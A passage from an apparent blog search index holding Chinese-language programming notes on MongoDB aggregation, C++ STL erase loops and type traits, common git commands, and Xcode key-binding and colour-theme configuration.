之间，表示该索引相对于其他索引字段的得分权重。\ndefault_language string 对于文本索引，该参数决定了停用词及词干和词器的规则的列表。 默认为英语\nlanguage_override string 对于文本索引，该参数指定了包含在文档中的字段名，语言覆盖默认的language，默认值为 language.\n```\n\n\n在后台创建索引：\n\n```\ndb.values.ensureIndex({open: 1, close: 1}, {background: true})\n```\n通过在创建索引时加background:true 的选项，让创建工作在后台执行\n\n\n\n### 聚合:\nMongoDB中聚合(aggregate)主要用于处理数据(诸如统计平均值,求和等)，并返回计算后的数据结果。有点类似sql语句中的 count(*)。\n\naggregate() 方法的基本语法格式如下所示：\n\n```\n>db.COLLECTION_NAME.aggregate(AGGREGATE_OPERATION)\n```\n\n```\n> db.col.find().pretty()\n{\n\t\"_id\" : ObjectId(\"58dc7efc70d2b5b8821b6184\"),\n\t\"title\" : \"MongoDB Overview\",\n\t\"description\" : \"MongoDB is no sql database\",\n\t\"by_user\" : \"w3cschool.cc\",\n\t\"url\" : \"http://www.w3cschool.cc\",\n\t\"tags\" : [\n\t\t\"mongodb\",\n\t\t\"database\",\n\t\t\"NoSQL\"\n\t],\n\t\"likes\" : 100\n}\n{\n\t\"_id\" : ObjectId(\"58dc7fcb70d2b5b8821b6185\"),\n\t\"title\" : \"NoSQL Overview\",\n\t\"description\" : \"No sql database is very fast\",\n\t\"by_user\" : \"w3cschool.cc\",\n\t\"url\" : \"http://www.w3cschool.cc\",\n\t\"tags\" : [\n\t\t\"mongodb\",\n\t\t\"database\",\n\t\t\"NoSQL\"\n\t],\n\t\"likes\" : 10\n}\n{\n\t\"_id\" : ObjectId(\"58dc7fe370d2b5b8821b6186\"),\n\t\"title\" : \"Neo4j Overview\",\n\t\"description\" : \"Neo4j is no sql database\",\n\t\"by_user\" : \"Neo4j\",\n\t\"url\" : \"http://www.neo4j.com\",\n\t\"tags\" : [\n\t\t\"neo4j\",\n\t\t\"database\",\n\t\t\"NoSQL\"\n\t],\n\t\"likes\" : 750\n}\n```\n\n```\n> db.col.aggregate([{$group:{_id:\"$by_user\", num_tutorial:{$sum:1}}}])\n{ \"_id\" : \"Neo4j\", \"num_tutorial\" : 1 }\n{ \"_id\" : \"w3cschool.cc\", \"num_tutorial\" : 2 }\n>\n```\n以上实例类似sql语句： select by_user, count(*) from mycol group by by_user\n\n//上面的_id不能变, 后面的字段可以自己指定\n\n下表展示了一些聚合的表达式:\n\n```\n表达式 描述 实例\n$sum 计算总和。 db.mycol.aggregate([{$group : {_id : \"$by_user\", num_tutorial : {$sum : \"$likes\"}}}])\n$avg 计算平均值 db.mycol.aggregate([{$group : {_id : \"$by_user\", num_tutorial : {$avg : \"$likes\"}}}])\n$min 获取集合中所有文档对应值得最小值。 db.mycol.aggregate([{$group : {_id : \"$by_user\", num_tutorial : {$min : \"$likes\"}}}])\n$max 获取集合中所有文档对应值得最大值。 db.mycol.aggregate([{$group : {_id : \"$by_user\", num_tutorial : {$max : \"$likes\"}}}])\n$push 在结果文档中插入值到一个数组中。 db.mycol.aggregate([{$group : {_id : \"$by_user\", url : {$push: \"$url\"}}}])\n$addToSet 在结果文档中插入值到一个数组中，但不创建副本。 db.mycol.aggregate([{$group : {_id : \"$by_user\", url : {$addToSet : \"$url\"}}}])\n$first 根据资源文档的排序获取第一个文档数据。 db.mycol.aggregate([{$group : {_id : \"$by_user\", first_url : {$first : \"$url\"}}}])\n$last 根据资源文档的排序获取最后一个文档数据 db.mycol.aggregate([{$group : {_id : \"$by_user\", last_url : {$last : \"$url\"}}}])\n```\n\n\n### 管道\n\n  ● $project：修改输入文档的结构。可以用来重命名、增加或删除域，也可以用于创建计算结果以及嵌套文档。\n\n  ● $match：用于过滤数据，只输出符合条件的文档。$match使用MongoDB的标准查询操作。\n\n  ● $limit：用来限制MongoDB聚合管道返回的文档数。\n\n  ● $skip：在聚合管道中跳过指定数量的文档，并返回余下的文档。\n\n  ● $unwind：将文档中的某一个数组类型字段拆分成多条，每条包含数组中的一个值。\n\n  ● $group：将集合中的文档分组，可用于统计结果。\n\n  ● $sort：将输入文档排序后输出。\n\n  ● $geoNear：输出接近某一地理位置的有序文档。\n\n\n1、$project实例\n\n```\ndb.article.aggregate(\n    { $project : {\n        title : 1 ,\n        author : 1 ,\n    }}\n );\n```\n这样的话结果中就只还有_id,tilte和author三个字段了，默认情况下_id字段是被包含的，如果要想不包含_id话可以这样:\n\n```\ndb.article.aggregate(\n    { $project : {\n        _id : 0 ,\n        title : 1 ,\n        author : 1\n    }});\n```\n```\n> db.article.find()\n{ \"_id\" : ObjectId(\"58dca39270d2b5b8821b6187\"), \"name\" : \"liuwei\", \"age\" : 123 }\n> db.article.aggregate(     { $project : {      name:1    }}  );\n{ \"_id\" : ObjectId(\"58dca39270d2b5b8821b6187\"), \"name\" : \"liuwei\" }\n> db.article.find({}, {name:1})\n{ \"_id\" : ObjectId(\"58dca39270d2b5b8821b6187\"), \"name\" : \"liuwei\" }\n```\n2.$match实例\n\n```\ndb.articles.aggregate( [\n                        { $match : { score : { $gt : 70, $lte : 90 } } },\n                        { $group: { _id: null, count: { $sum: 1 } } }\n                       ] );\n```\n$match用于获取分数大于70小于或等于90记录，然后将符合条件的记录送到下一阶段$group管道操作符进行处理。\n\n3.$skip实例\n\n```\ndb.article.aggregate(\n    { $skip : 5 });\n```\n经过$skip管道操作符处理后，前五个文档被\"过滤\"掉。\n\n\n### 数据库引用:\n\nDBRef的形式：\n\n```\n{ $ref : , $id : , $db :  }\n三个字段表示的意义为：\n  ● $ref：集合名称\n  ● $id：引用的id\n  ● $db:数据库名称，可选参数\n```\n\naddress DBRef 字段指定了引用的地址文档是在 address_home 集合下的 w3cschoolcc 数据库，id 为 534009e4d852427820000002。\n以下代码中，我们通过指定 $ref 参数（address_home 集合）来查找集合中指定id的用户地址信息：\n\n```\n>var user = db.users.findOne({\"name\":\"Tom Benzamin\"})\n>var dbRef = user.address\n>db[dbRef.$ref].findOne({\"_id\":(dbRef.$id)})\n```\n\n\n### 使用 explain()\nexplain 操作提供了查询信息，使用索引及查询统计等。有利于我们对索引的优化。\n接下来我们在 users 集合中创建 gender 和 user_name 的索引：\n\n```\ndb.users.find({gender:\"M\"},{user_name:1,_id:0}).explain()\n```\n\n\n### 使用 hint()\n虽然MongoDB查询优化器一般工作的很不错，但是也可以使用 hint 来强制 MongoDB 使用一个指定的索引。\n这种方法某些情形下会提升性能。 一个有索引的 collection 并且执行一个多字段的查询(一些字段已经索引了)。\n如下查询实例指定了使用 gender 和 user_name 索引字段来查询：\n\n```\n>db.users.find({gender:\"M\"},{user_name:1,_id:0}).hint({gender:1,user_name:1})\n```\n\n","tags":["mongodb"],"categories":["sql"]},{"title":"c++stl容器循环earse用法","url":"%2Fp%2F6556ac6a.html","content":"\n### vector deque\n在使用 vector、deque遍历删除元素时，也可以通过erase的返回值来获取下一个元素的位置：\n\n```\n      std::vector< int> Vec;\n      std::vector< int>::iterator itVec;\n      for( itVec = Vec.begin(); itVec != Vec.end(); )\n      {\n            if( WillDelete( *itVec) )\n            {\n                 itVec = Vec.erase( itVec);\n            }\n            else\n               itList++;\n      }\n```\n<!-- more -->\n\n### list set map \n在 使用 list、set 或 map遍历删除某些元素时可以这样使用：\n\n```\n      std::list< int> List;\n      std::list< int>::iterator itList;\n      for( itList = List.begin(); itList != List.end(); )\n      {\n            if( WillDelete( *itList) )\n            {\n               itList = List.erase( itList);\n            }\n            else\n               itList++;\n      }\n```\n\n\n```\n      std::list< int> List;\n      std::list< int>::iterator itList;\n      for( itList = List.begin(); itList != List.end(); )\n      {\n            if( WillDelete( *itList) )\n            {\n               List.erase( itList++);\n            }\n            else\n               itList++;\n      }\n```\n","tags":["c++"],"categories":["c++"]},{"title":"c++11的模板类型判断std::is_same和std::decay","url":"%2Fp%2F1e4be646.html","content":"\n问题提出：有一个模板函数，函数在处理int型和double型时需要进行特殊的处理，那么怎么在编译期知道传入的参数的数据类型是int型还是double型呢？ \n如：\n\n\n```cpp\n#include <iostream>\ntemplate <typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    //do something check data type\n\t//std::cout<< out put the type\n}\n```\n\n这里就需要用到C++11的type_traits头文件了，type_traits头文件定义了很多类型检查相关的方法，上面的例子具体用到了其中两个结构：\n\n## std::is_same 判断类型是否一致\n\n位于头文件`<type_traits>`中\n这个结构体作用很简单，就是两个一样的类型会返回true\n\n```cpp\nbool isInt = std::is_same<int, int>::value; //为true\n```\n\n下面是官方的例子：\n\n```cpp\n#include <iostream>\n#include <type_traits>\n#include <cstdint>\n\nvoid print_separator()\n{\n    std::cout << \"-----\\n\";\n}\n\nint main()\n{\n    std::cout << std::boolalpha;\n\n    std::cout << std::is_same<int, int32_t>::value << '\\n';   // true\n    std::cout << std::is_same<int, int64_t>::value << '\\n';   // false\n    std::cout << std::is_same<float, int32_t>::value << '\\n'; // false\n\n    print_separator();\n\n    std::cout << std::is_same<int, int>::value << \"\\n\";          // true\n    std::cout << std::is_same<int, unsigned int>::value << \"\\n\"; // false\n    std::cout << std::is_same<int, signed int>::value << \"\\n\";   // true\n\n    print_separator();\n\n    // unlike other types 'char' is not 'unsigned' and not 'signed'\n    std::cout << std::is_same<char, char>::value << \"\\n\";          // true\n    std::cout << std::is_same<char, unsigned char>::value << \"\\n\"; // false\n    std::cout << std::is_same<char, signed char>::value << \"\\n\";   // false\n}\n```\n\n通过std::is_same即可判断两个类型是否一样，特别在模板里面，在不清楚模板的参数时，此功能可以对一些特定的参数类型进行特殊的处理。\n\n<!-- more -->\n\n> 这里说个题外话，大家是否通过std::is_same发现，char既不是unsigned char也不是signed char，char就是char，这和int是signed int的缩写是不一样的，char的表达范围可能等同于signed char，也可能等同于unsigned char，取决于编译器，一般是等同于signed char，但这个仅仅是范围等同，就像32位上int和long范围是一样的，但不是同一个类型。\n> \n> 因为用途不同，char用于表达字符，理论上不应该关心其正负的实现，而signed char 和 unsigned char 用于表达数值，或可移植的char。\n\n\n回到正文，std::is_same可以判断两种类似是否一样，那么用在模板里就是利器了，本位一开始提到的那个问题就可以这样写：\n\n```cpp\n#include <iostream>\ntemplate<typename TYPE>\ntypeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\";\n        //do something int \n    }\n    else\n    {\n        //.........\n    }\n}\n```\n\n看似很美好，再看一个示例：\n\n```cpp\n// is_same example\n#include <iostream>\n#include <type_traits>\n#include <cstdint>\n\ntypedef int integer_type;\nstruct A { int x,y; };\nstruct B { int x,y; };\ntypedef A C;\n\nint main() {\n      std::cout << std::boolalpha;\n      std::cout << \"is_same:\" << std::endl;\n      std::cout << \"int, const int: \" << std::is_same<int, const int>::value << std::endl;//false\n      std::cout << \"int, int&: \" << std::is_same<int, int&>::value << std::endl;//false\n      std::cout << \"int, const int&: \" << std::is_same<int, const int&>::value << std::endl;//false\n      std::cout << \"int, integer_type: \" << std::is_same<int, integer_type>::value << std::endl;//true\n      std::cout << \"A, B: \" << std::is_same<A,B>::value << std::endl;//false\n      std::cout << \"A, C: \" << std::is_same<A,C>::value << std::endl;//true\n      std::cout << \"signed char, std::int8_t: \" << std::is_same<signed char,std::int8_t>::value << std::endl;//true\n      return 0;\n}\n```\n输出：\n\n```cpp\nis_same:\nint, const int: false\nint, int&: false\nint, const int&: false\nint, integer_type: true\nA, B: false\nA, C: true\nsigned char, std::int8_t: true\n```\n\n可以发现std::is_same的判断是很严格的,再看下面的一个例子：\n\n```cpp\n#include <stdlib.h>\n#include <iostream>\n#include <type_traits>\n\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n    const int& e = d[7];\n    typeCheck(a);//int type\n    typeCheck(b);//int type\n    typeCheck(c);//int type\n    typeCheck(d[7]);//int type\n    typeCheck(e);//int type\n    typeCheck(8);//int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else if(std::is_same<TYPE,std::string>::value)\n    {\n        std::cout<<\"string type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\";\n    }\n}\n```\n输出：\n\n```cpp\nint type\nint type\nint type\nint type\nint type\nint type\n```\n\n测试后发现，虽然变量b,c, e使用的是引用，std::is_same那么严格为什么是int_type呢? 因为在写模板函数时，经常会强制指定const引用进行传参，以免进行数据拷贝，这时候is_same就做出了相等的判断.\n\n\n\n> 如果我们显示的指定模板参数类型时情况有不一样了：\n\n```cpp\n#include <stdlib.h>\n#include <iostream>\n#include <type_traits>\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n\n    typeCheck<int>(a);        //int type\n    typeCheck<const int&>(b);//other type\n    typeCheck<int &>(c);        //other type\n    typeCheck<const int&>(d[7]);//other type\n    typeCheck(8);                //int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<TYPE,int>::value)\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else if(std::is_same<TYPE,std::string>::value)\n    {\n        std::cout<<\"string type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\";\n    }\n}\n```\n输出：\n\n```cpp\nint type\nother type\nother type\nother type\nint type\n```\n瞬间结果就不一样了，这很好了解，从上面可知道，std::is_same对int\\ const int\\ int &\\ const int& 等都是区别对待的.\n\n\n> 但是有时候其实我们还是希望TYPE和const TYPE& 是能认为是一样的，这时就需要std::decay进行退化处理\n\n\n## std::decay 退化类型的修饰\n\nstd::decay就是对一个类型进行退化处理，他的实现如下:\n\n```cpp\ntemplate< class T >\nstruct decay {\nprivate:\n    typedef typename std::remove_reference<T>::type U;\npublic:\n    typedef typename std::conditional< \n        std::is_array<U>::value,\n        typename std::remove_extent<U>::type*,\n        typename std::conditional< \n            std::is_function<U>::value,\n            typename std::add_pointer<U>::type,\n            typename std::remove_cv<U>::type\n        >::type\n    >::type type;\n};\n```\n看着比较抽象，其实就是把各种引用啊什么的修饰去掉，把cosnt int&退化为int，这样就能通过std::is_same正确识别出加了引用的类型了 \n上面的例子改为：\n\n```cpp\n#include <iostream>\n#include <type_traits>\n\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data);\n\nint main()\n{\n    int a = 1;\n    const int& b = a;\n    int& c = a;\n    int d[12];\n\n    typeCheck<int>(a);//int type\n    typeCheck<const int&>(b);//int type\n    typeCheck<int &>(c);//int type\n    typeCheck<const int&>(d[7]);//int type\n    typeCheck(8);//int type\n    return 0;\n}\n\ntemplate<typename TYPE>\nvoid typeCheck(TYPE data)\n{\n    if(std::is_same<typename std::decay<TYPE>::type,int>::value)//c++11\n    //if(std::is_same<std::decay_t<TYPE>, int>::value)//c++14\n    {\n        std::cout<<\"int type\"<<std::endl;\n    }\n    else\n    {\n        std::cout<<\"other type\"<<std::endl;\n    }\n}\n```\n\n在cppref有个更加详细的例子：\n\n```cpp\n#include <iostream>\n#include <type_traits>\n\ntemplate <typename T, typename U>\nstruct decay_equiv : \n    std::is_same<typename std::decay<T>::type, U>::type \n{};\n\nint main()\n{\n    std::cout << std::boolalpha\n              << decay_equiv<int, int>::value << '\\n'\n              << decay_equiv<int&, int>::value << '\\n'\n              << decay_equiv<int&&, int>::value << '\\n'\n              << decay_equiv<const int&, int>::value << '\\n'\n              << decay_equiv<int[2], int*>::value << '\\n'\n              << decay_equiv<int(int), int(*)(int)>::value << '\\n';\n}\n```\n\n输出:\n\n```cpp\ntrue\ntrue\ntrue\ntrue\ntrue\ntrue\n```\n\n## 总结：\n+ 在模板里可以通过std::is_same判断模板的类型，从而实现对不同类型的区别对待\n\n+ 在堆类型要求不是非常严格的情况下，可以使用std::decay把类型退化为基本形态，结合std::is_same用，可以判断出更多的情况\n","tags":["c++"],"categories":["c++"]},{"title":"git实用操作总结","url":"%2Fp%2F42eae4e7.html","content":"\n### git的配置\n1. 安装git\n2. 安装完成后，需要设置自己的用户名和email，在命令行输入：\n\n```bash\ngit config --global user.name \"levon\"\ngit config --global user.email \"levonfly@gmail.com\"\n```\n\n### git和目录绑定\n1. 在一个目录里可以通过git init命令把这个目录变成Git可以管理的仓库,然后通过以下命令绑定提交的地址\n\n```bash\ngit remote add origin https://github.com/unix2dos/unix2dos.github.io\n```\n\n2. git clone 地址 就会创建目录和地址绑定\n<!-- more -->\n\n### git的基础操作\n1. 命令git add \t      把文件添加到仓库\n2. 命令git commit \t  把文件提交到仓库\n3. 命令git pull \t  把远程仓库拉取文件\n4. 命令git push       把文件提交到远程仓库\n5. 命令git log \t      查看git提交日志\n6. 如果嫌输出信息太多, 可以加上--pretty=oneline参数. 另外也可以花式log输出, git lg查看下\n\n\t```bash\n\tgit config --global alias.lg \"log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit --date=relative\"\n\t```\n7. 命令git diff 查看版本之间文件修改变化\n\n\t```bash\n\tgit diff 87b91b6 f9b3075 [--name-only]加上可以只看文件名字\n\t```\n\n### git 回滚版本\n在Git中，用HEAD表示当前版本,上一个版本就是HEAD^,上上一个版本就是HEAD^^,当然往上100个版本写100个^比较容易数不过来，所以写成HEAD~100。\n\n1. 回滚到上一个版本\n```bash\ngit reset --hard HEAD^\n```\n2. 回滚到任意一个版本\n```bash\ngit reset --hard 版本号(通过git log查看)\n```\n3. 如果git回滚到历史版本后, git log只能看历史版本再以前的版本号, 不到未来的版本号怎么办?\n>git 提供了一个命令git reflog用来记录你的每一次命令\n\n\n\n### git回滚文件\n+ 查看文件的修改记录\n\n```bash\ngit log config.h\n```\n+ 查看文件版本的差别\n\n```bash\ngit diff a3551 fd681 config.h\n```\n+  回退到指定的版本\n\n```bash\ngit reset fd681 config.h\n```\n+  提交到本地参考\n\n```bash\ngit commit -m \"revert old file because commmit have a bug\"   \n```\n+ 更新到工作目录\n\n```bash\ngit checkout config.h   \n```\n+ 提交到远程仓库\n\n```bash\ngit push origin master  \n```\n\n\n### git撤销操作\n\n+ git修改文件后, 还没有add, commit.  这时撤销文件修改, 即回到上一版本的内容\n\n```bash\ngit checkout -- file\n```\n命令中的--很重要，没有--，就变成了“创建一个新分支”的命令，我们在后面的分支管理中会再次遇到git checkout命令。\n\n+ git add 文件后撤销add操作\n\n```bash\ngit reset HEAD file\n```\n\n### git解决冲突\n\n1. 建议手动解决冲突\n\n2. 命令行可以使用别人或自己的版本\n\n```bash\ngit checkout --theirs/--ours  file\n```\n\n### git全局配置\n\n+ 中文不再显示8进制  git status显示中文\n\n```bash\ngit config --global core.quotepath false\n```\n\n+ 设置代理, 因为国内一些原因下载的很慢\n\n```bash\ngit config --global http.proxy 'localhost:8123'\ngit config --global --unset http.proxy\n```\n\n+ git区分文件大小写\n\ngit默认不区分文件大小写,导致文件名改了以后git状态没有改变,需要设置一下\n\n```\ngit config core.ignorecase false\n```\n\n\n### git 分支操作\n查看分支：git branch\n\n创建分支：git branch <name>\n\n切换分支：git checkout <name>\n\n创建+切换分支：git checkout -b <name>\n\n合并某分支到当前分支：git merge <name>\n\n删除分支：git branch -d <name>\n\n\n### git 标签操作\n\n命令git tag <name>用于新建一个标签，默认为HEAD，也可以指定一个commit id；\n\ngit tag -a <tagname> -m \"blablabla...\"可以指定标签信息；\n\ngit tag -s <tagname> -m \"blablabla...\"可以用PGP签名标签；\n\n命令git tag可以查看所有标签。\n\n命令git push origin <tagname>可以推送一个本地标签；\n\n命令git push origin --tags可以推送全部未推送过的本地标签；\n\n命令git tag -d <tagname>可以删除一个本地标签；\n\n命令git push origin :refs/tags/<tagname>可以删除一个远程标签。\n\n\n### git 合并 commit\n\n```\ngit rebase -i \"合并前一个版本号\"// 合并前一个 版本号\n\n\tpick 是用commit\n\tsquash 是合并前一个\n\n:wq 退出修改合并后的 commit log\n\ngit rebase --abort 如果出现失误来撤销\n```\n\n\n### github fork后更新源仓库的代码\n\n```bash\ngit remote add upstream https://github.com/golang/go\ngit remote -v\ngit fetch upstream\ngit merge upstream/master\n```\n\n### git 增加 远程仓库 orgin(名字不一样)\n\n```\ngit remote add github git@github.com:unix2dos/dht.git\ngit push github master\n```\n\n### git 分支修改名字\n\n```\ngit branch -m 原名 新名\n```\n\n\n### git撤销操作\n\n+ git push 后撤销\n\n```\ngit revert <hash> \n```\n\n+ commit消息撤销\n\n```\ngit commit --amend -m '新的消息'\n```\n+ 回滚文件的改动(未有commit) \n\n```\ngit checkout -- <filename>\n```\n+ 回滚版本\n\n```\ngit reset --hard <hash>  (--hard强制内容回归,如果修改内容保留不加此选项)\n```\n\n+ 停止追踪一个文件\n\n你偶然把application.log加到代码库里了，现在每次你运行应用，Git都会报告在application.log里有未提交的修改。你把 *.log放到了.gitignore文件里，可文件还是在代码库里，你怎样才能让Git“撤销”对这个文件的追踪呢？\n\n```\ngit rm --cached application.log\n```\n\n\n### git lg 完美显示\n\n```\ngit config --global alias.lg \"log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit\"\n```","tags":["git"],"categories":["git"]},{"title":"xcode自定义Eclipse中常用的快捷键","url":"%2Fp%2F30321ed4.html","content":"\n\n\n首先找到Xcode中的自带的配置文件\n\n```\n/Applications/Xcode.app/Contents/Frameworks/IDEKit.framework/Versions/A/Resources/IDETextKeyBindingSet.plist\n```\n这个文件里配置了一些可以设置快捷键的操作, 使用常用的编辑器打开它（需要root权限）。\n\n```\n\t<key>GDI Commands</key>\n\t<dict>\n\t\t<key>GDI Duplicate Current Line</key>\n\t\t<string>selectLine:, copy:, moveToEndOfLine:, insertNewline:, paste:, deleteBackward:</string>\n\t\t<key>GDI Delete Current Line</key>\n\t\t<string>deleteToBeginningOfLine:, moveToEndOfLine:, deleteToBeginningOfLine:, deleteBackward:, moveDown:, moveToBeginningOfLine:</string>\n\t\t<key>GDI Move Current Line Up</key>\n\t\t<string>selectLine:, cut:, moveUp:, moveToBeginningOfLine:, insertNewLine:, paste:, moveBackward:</string>\n\t\t<key>GDI Move Current Line Down</key>\n\t\t<string>selectLine:, cut:, moveDown:, moveToBeginningOfLine:, insertNewLine:, paste:, moveBackward:</string>\n\t\t<key>GDI Insert Line Above</key>\n\t\t<string>moveUp:, moveToEndOfLine:, insertNewline:</string>\n\t\t<key>GDI Insert Line Below</key>\n\t\t<string>moveToEndOfLine:, insertNewline:</string>\n\t</dict>\n```\n<!-- more -->\n把这段配置放到上面提到的IDETextKeyBindingSet.plist里，放在文件的最后的这两行之前：\n</dict>\n</plist>\n\n重启Xcode，在Xcode菜单中，打开Preferences，选中Key Binding，在右上方搜索GDI, 会出现类似下图的显示，如果没有的话，请检查上面的每步操作。\n\n","tags":["xcode"],"categories":["软件"]},{"title":"xcode主题","url":"%2Fp%2Fb884c3b7.html","content":"\n\n\n### Xcode 主题\n\n```\nhttps://github.com/tursunovic/xcode-themes\n```\n\n### elfDark\n\n```\nhttps://code.google.com/archive/p/elf-ios-resource/downloads\n\ncd /Users/liuwei/Library/Developer/Xcode/UserData/FontAndColorThemes 放进去\n```\n\n\n<!-- more -->\n\n### cat ElfDark.xccolortheme\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>DVTConsoleDebuggerInputTextColor</key>\n\t<string>1 0.986905 0.947622 1</string>\n\t<key>DVTConsoleDebuggerInputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleDebuggerOutputTextColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleDebuggerOutputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleDebuggerPromptTextColor</key>\n\t<string>1 0.036325 0.0717013 1</string>\n\t<key>DVTConsoleDebuggerPromptTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleExectuableInputTextColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleExectuableInputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleExectuableOutputTextColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTConsoleExectuableOutputTextFont</key>\n\t<string>SFMono-Bold - 12.0</string>\n\t<key>DVTConsoleTextBackgroundColor</key>\n\t<string>0.109 0.109 0.109 1</string>\n\t<key>DVTConsoleTextInsertionPointColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTConsoleTextSelectionColor</key>\n\t<string>0.416 0.869 1 1</string>\n\t<key>DVTDebuggerInstructionPointerColor</key>\n\t<string>0.705792 0.8 0.544 1</string>\n\t<key>DVTMarkupTextBackgroundColor</key>\n\t<string>0.145 0.145 0.145 1</string>\n\t<key>DVTMarkupTextBorderColor</key>\n\t<string>0.2134 0.2134 0.2134 1</string>\n\t<key>DVTMarkupTextCodeFont</key>\n\t<string>SFMono-Regular - 13.0</string>\n\t<key>DVTMarkupTextEmphasisColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextEmphasisFont</key>\n\t<string>.AppleSystemUIFontItalic - 13.0</string>\n\t<key>DVTMarkupTextInlineCodeColor</key>\n\t<string>1 1 1 0.7</string>\n\t<key>DVTMarkupTextLinkColor</key>\n\t<string>0.192442 0.469436 0.928 1</string>\n\t<key>DVTMarkupTextLinkFont</key>\n\t<string>.AppleSystemUIFont - 13.0</string>\n\t<key>DVTMarkupTextNormalColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextNormalFont</key>\n\t<string>.AppleSystemUIFont - 13.0</string>\n\t<key>DVTMarkupTextOtherHeadingColor</key>\n\t<string>1 1 1 0.5</string>\n\t<key>DVTMarkupTextOtherHeadingFont</key>\n\t<string>.AppleSystemUIFont - 18.2</string>\n\t<key>DVTMarkupTextPrimaryHeadingColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextPrimaryHeadingFont</key>\n\t<string>.AppleSystemUIFont - 31.2</string>\n\t<key>DVTMarkupTextSecondaryHeadingColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextSecondaryHeadingFont</key>\n\t<string>.AppleSystemUIFont - 23.4</string>\n\t<key>DVTMarkupTextStrongColor</key>\n\t<string>1 1 1 1</string>\n\t<key>DVTMarkupTextStrongFont</key>\n\t<string>.AppleSystemUIFontBold - 13.0</string>\n\t<key>DVTSourceTextBackground</key>\n\t<string>0.0706522 0.0706522 0.0706522 1</string>\n\t<key>DVTSourceTextBlockDimBackgroundColor</key>\n\t<string>0.109 0.109 0.109 1</string>\n\t<key>DVTSourceTextCurrentLineHighlightColor</key>\n\t<string>0.0609167 0.0946952 0.138587 1</string>\n\t<key>DVTSourceTextInsertionPointColor</key>\n\t<string>0 0.923 0.084 1</string>\n\t<key>DVTSourceTextInvisiblesColor</key>\n\t<string>0.137973 0.380435 0.195417 1</string>\n\t<key>DVTSourceTextSelectionColor</key>\n\t<string>0.0317101 0.166824 0.342391 1</string>\n\t<key>DVTSourceTextSyntaxColors</key>\n\t<dict>\n\t\t<key>xcode.syntax.attribute</key>\n\t\t<string>1 0.904 0.984 1</string>\n\t\t<key>xcode.syntax.character</key>\n\t\t<string>0.921429 0.70068 0.169311 1</string>\n\t\t<key>xcode.syntax.comment</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.comment.doc</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.comment.doc.keyword</key>\n\t\t<string>0 0.502 0 1</string>\n\t\t<key>xcode.syntax.identifier.class</key>\n\t\t<string>0.355 0.922 0.986 1</string>\n\t\t<key>xcode.syntax.identifier.class.system</key>\n\t\t<string>0.229 0.721 0.887 1</string>\n\t\t<key>xcode.syntax.identifier.constant</key>\n\t\t<string>0.228 0.718 0.882 1</string>\n\t\t<key>xcode.syntax.identifier.constant.system</key>\n\t\t<string>0.228 0.718 0.882 1</string>\n\t\t<key>xcode.syntax.identifier.function</key>\n\t\t<string>0.248 0.78 0.959 1</string>\n\t\t<key>xcode.syntax.identifier.function.system</key>\n\t\t<string>0.227 0.714 0.878 1</string>\n\t\t<key>xcode.syntax.identifier.macro</key>\n\t\t<string>0.218579 0.6826 0.839759 1</string>\n\t\t<key>xcode.syntax.identifier.macro.system</key>\n\t\t<string>0.467 0.881 1 1</string>\n\t\t<key>xcode.syntax.identifier.type</key>\n\t\t<string>0.229 0.721 0.887 1</string>\n\t\t<key>xcode.syntax.identifier.type.system</key>\n\t\t<string>0.222 0.699 0.86 1</string>\n\t\t<key>xcode.syntax.identifier.variable</key>\n\t\t<string>0.23 0.725 0.891 1</string>\n\t\t<key>xcode.syntax.identifier.variable.system</key>\n\t\t<string>0.225 0.707 0.869 1</string>\n\t\t<key>xcode.syntax.keyword</key>\n\t\t<string>1 0.11 0.157 1</string>\n\t\t<key>xcode.syntax.number</key>\n\t\t<string>0.341 0.923 0.326 1</string>\n\t\t<key>xcode.syntax.plain</key>\n\t\t<string>1 1 1 1</string>\n\t\t<key>xcode.syntax.preprocessor</key>\n\t\t<string>0.18956 0.673603 0.983696 1</string>\n\t\t<key>xcode.syntax.string</key>\n\t\t<string>1 0.761311 0.178664 1</string>\n\t\t<key>xcode.syntax.url</key>\n\t\t<string>0.192442 0.469436 0.928 